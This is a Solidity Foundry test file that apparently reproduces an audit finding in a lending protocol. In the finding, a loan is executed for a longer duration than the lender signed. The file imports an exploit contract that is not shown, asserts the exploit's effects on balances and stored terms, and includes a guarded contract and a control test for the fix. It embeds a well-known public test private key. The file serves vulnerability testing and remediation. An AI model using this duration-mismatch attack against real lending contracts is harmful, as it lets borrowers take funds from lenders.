// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MultiSourceLoan,
    PrincipalToken,
    Terms
} from "./35215-h-13-processoffersfromexecutiondata-lack-of-check-execution.sol";

/// Fix: reject an execution duration longer than the signed offer.
contract GuardedLoan {
    function emitLoan(MultiSourceLoan.LoanOffer calldata offer, uint256 executionDuration) external pure {
        require(executionDuration <= offer.duration, "duration");
    }
}

contract Finding35215Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 constant LENDER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address constant LENDER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant LOAN = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;

    function _deploy() internal returns (Exploit e) {
        vm.chainId(1);
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        e = new Exploit();
    }

    function test_embedded_signature_is_the_lender_key() public {
        Exploit e = _deploy();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.token()), TOKEN, "token");
        assertEq(address(e.loan()), LOAN, "loan");
        bytes32 digest = e.loan().digest(e.loan().previewOffer());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_PK, digest);
        assertEq(abi.encodePacked(r, s, v), e.lenderSignature(), "sig");
        assertEq(vm.addr(LENDER_PK), LENDER, "lender");
    }

    function test_loan_runs_a_year_past_the_signature() public {
        Exploit e = _deploy();
        vm.prank(ATTACKER);
        e.run();

        assertEq(e.loan().storedDuration(), Terms.EXECUTED, "stored");
        assertEq(e.loan().signedDuration(), Terms.SIGNED, "signed");
        assertEq(e.loan().extraInterest(), Terms.EXTRA, "extra");
        assertEq(e.token().balanceOf(address(e.loan())), Terms.EXTRA, "escrow");
        assertEq(e.token().balanceOf(LENDER), 0, "lender");
        assertEq(e.token().balanceOf(address(e)), Terms.PRINCIPAL - Terms.EXTRA, "borrower net");
        assertEq(e.loan().bookedMaxInterest(), Terms.PRINCIPAL + Terms.ACTUAL_INTEREST, "booked");
    }

    function test_control_rejects_the_longer_duration() public {
        GuardedLoan guarded = new GuardedLoan();
        MultiSourceLoan.LoanOffer memory offer;
        offer.duration = Terms.SIGNED;
        vm.expectRevert(bytes("duration"));
        guarded.emitLoan(offer, Terms.EXECUTED);
    }
}
